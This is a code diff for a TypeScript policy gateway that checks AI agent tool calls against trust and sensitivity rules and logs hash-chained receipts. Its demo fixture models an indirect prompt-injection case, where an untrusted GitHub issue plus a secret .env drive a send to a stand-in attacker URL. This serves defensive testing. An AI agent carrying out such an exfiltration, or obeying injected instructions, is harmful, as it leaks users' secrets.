@@ -1,58 +1,77 @@
-import { createHash, randomUUID } from "node:crypto";
-import { createServer } from "node:http";
+import { randomUUID, timingSafeEqual } from "node:crypto";
+import { createServer, type IncomingMessage, type ServerResponse } from "node:http";
+import { ReceiptLedger, hashReceipt, type ReceiptSignature } from "./ledger.js";
+import { PolicyEngine } from "./policy.js";
 
-type Trust = "trusted" | "external" | "untrusted";
-type Sensitivity = "public" | "internal" | "confidential" | "secret";
-type Decision = "allow" | "block" | "approval_required";
-export type Action = { tool: string; destination?: string; writes?: boolean; context: { source: string; trust: Trust; sensitivity: Sensitivity; contentHash?: string }[] };
-export type Receipt = { id: string; timestamp: string; decision: Decision; reason: string; policy: string; action: Action; previousHash: string | null; hash: string };
+export type Trust = "trusted" | "external" | "untrusted";
+export type Sensitivity = "public" | "internal" | "confidential" | "secret";
+export type Decision = "allow" | "block" | "approval_required";
+export type ContextEnvelope = { source: string; trust: Trust; sensitivity: Sensitivity; contentHash?: string };
+export type Action = { tool: string; destination?: string; writes?: boolean; context: ContextEnvelope[]; actor?: { id: string; role?: string } };
+export type Receipt = { id: string; timestamp: string; decision: Decision; reason: string; policy: string; policyVersion: string; action: Action; previousHash: string | null; hash: string; signature?: ReceiptSignature };
 
-let previousHash: string | null = null;
-const receipts: Receipt[] = [];
-const approvedDestinations = new Set(["internal://diagnostics", "https://api.example.internal"]);
+const policy = new PolicyEngine();
+const ledger = new ReceiptLedger({ path: process.env.ATREIDES_RECEIPT_PATH, signingKey: process.env.ATREIDES_RECEIPT_SIGNING_KEY, signingKeyId: process.env.ATREIDES_RECEIPT_SIGNING_KEY_ID });
+const rateWindows = new Map<string, { count: number; startedAt: number }>();
 
 export function evaluate(action: Action): Receipt {
-  const untrusted = action.context.some((item) => item.trust !== "trusted");
-  const secret = action.context.some((item) => item.sensitivity === "secret");
-  const external = Boolean(action.destination && !approvedDestinations.has(action.destination));
-  let decision: Decision = "allow";
-  let policy = "atreides/default-allow";
-  let reason = "No protected capability crosses an untrusted boundary.";
-  if (untrusted && action.tool === "filesystem.read_secret") {
-    decision = "block"; policy = "atreides/no-untrusted-secret-read";
-    reason = "Untrusted context cannot authorize a secret-read capability.";
-  } else if (untrusted && secret && external) {
-    decision = "block"; policy = "atreides/no-untrusted-secret-egress";
-    reason = "Untrusted context cannot authorize transmission of secret-labelled data to an unapproved destination.";
-  } else if (untrusted && (action.writes || external)) {
-    decision = "approval_required"; policy = "atreides/untrusted-high-impact-action";
-    reason = "Untrusted context reached a high-impact capability; explicit human approval is required.";
-  }
-  const base = { id: randomUUID(), timestamp: new Date().toISOString(), decision, reason, policy, action, previousHash };
-  const hash = createHash("sha256").update(JSON.stringify(base)).digest("hex");
-  const receipt = { ...base, hash };
-  previousHash = hash; receipts.push(receipt); return receipt;
+  const decision = policy.evaluate(action);
+  const base: Omit<Receipt, "hash" | "signature"> = {
+    id: randomUUID(), timestamp: new Date().toISOString(), decision: decision.decision, reason: decision.reason,
+    policy: decision.id, policyVersion: policy.bundle.version, action, previousHash: ledger.previousHash,
+  };
+  const hash = hashReceipt({ ...base, hash: "" });
+  const receipt: Receipt = { ...base, hash, signature: ledger.sign(hash) };
+  ledger.append(receipt);
+  return receipt;
 }
+
+export function listReceipts() { return ledger.list(); }
+export function verifyReceipts() { return ledger.verify(); }
+export function currentPolicy() { return policy.bundle; }
 
 export const indirectInjectionFixture: Action = {
   tool: "diagnostics.send", destination: "https://attacker.invalid/collect",
   context: [
     { source: "github-issue#184", trust: "untrusted", sensitivity: "public", contentHash: "fixture:issue-184" },
-    { source: ".env", trust: "trusted", sensitivity: "secret", contentHash: "fixture:fake-secret" }
-  ]
+    { source: ".env", trust: "trusted", sensitivity: "secret", contentHash: "fixture:fake-secret" },
+  ],
 };
 
-function send(response: import("node:http").ServerResponse, status: number, payload: unknown) {
-  response.writeHead(status, { "content-type": "application/json", "access-control-allow-origin": "*" });
-  response.end(JSON.stringify(payload, null, 2));
+function send(response: ServerResponse, status: number, payload: unknown) {
+  response.writeHead(status, {
+    "content-type": "application/json", "access-control-allow-origin": process.env.ATREIDES_CORS_ORIGIN ?? "*",
+    "access-control-allow-methods": "GET,POST,OPTIONS", "access-control-allow-headers": "content-type,authorization",
+  });
+  response.end(status === 204 ? undefined : JSON.stringify(payload, null, 2));
+}
+
+function authorized(request: IncomingMessage) {
+  const token = process.env.ATREIDES_API_TOKEN;
+  if (!token) return true;
+  const received = request.headers.authorization?.replace(/^Bearer\s+/i, "") ?? "";
+  return received.length === token.length && timingSafeEqual(Buffer.from(received), Buffer.from(token));
+}
+
+function withinRateLimit(request: IncomingMessage) {
+  const limit = Number(process.env.ATREIDES_RATE_LIMIT_PER_MINUTE ?? 0);
+  if (!Number.isFinite(limit) || limit <= 0) return true;
+  const key = request.socket.remoteAddress ?? "unknown"; const now = Date.now(); const active = rateWindows.get(key);
+  const window = !active || now - active.startedAt >= 60_000 ? { count: 0, startedAt: now } : active;
+  window.count += 1; rateWindows.set(key, window);
+  return window.count <= limit;
 }
 
 export const server = createServer(async (request, response) => {
+  const url = new URL(request.url ?? "/", "http://localhost");
   if (request.method === "OPTIONS") return send(response, 204, {});
-  if (request.url === "/health") return send(response, 200, { status: "ok", service: "atreides-gateway", receipts: receipts.length });
-  if (request.method === "GET" && request.url === "/v1/receipts") return send(response, 200, { receipts });
-  if (request.method === "POST" && request.url === "/v1/demo/indirect-prompt-injection") return send(response, 200, { receipt: evaluate(indirectInjectionFixture) });
-  if (request.method === "POST" && request.url === "/v1/evaluate") {
+  if (url.pathname === "/health") return send(response, 200, { status: "ok", service: "atreides-gateway", receipts: listReceipts().length, policyVersion: policy.bundle.version, durableReceipts: Boolean(process.env.ATREIDES_RECEIPT_PATH), signedReceipts: Boolean(process.env.ATREIDES_RECEIPT_SIGNING_KEY) });
+  if (!authorized(request)) return send(response, 401, { error: "Unauthorized." });
+  if (!withinRateLimit(request)) return send(response, 429, { error: "Rate limit exceeded." });
+  if (request.method === "GET" && url.pathname === "/v1/receipts") return send(response, 200, { receipts: listReceipts(), verification: url.searchParams.get("verify") === "true" ? verifyReceipts() : undefined });
+  if (request.method === "GET" && url.pathname === "/v1/policy") return send(response, 200, currentPolicy());
+  if (request.method === "POST" && url.pathname === "/v1/demo/indirect-prompt-injection") return send(response, 200, { receipt: evaluate(indirectInjectionFixture) });
+  if (request.method === "POST" && url.pathname === "/v1/evaluate") {
     let body = ""; for await (const chunk of request) body += chunk;
     try { return send(response, 200, { receipt: evaluate(JSON.parse(body) as Action) }); }
     catch { return send(response, 400, { error: "Expected a valid action payload." }); }
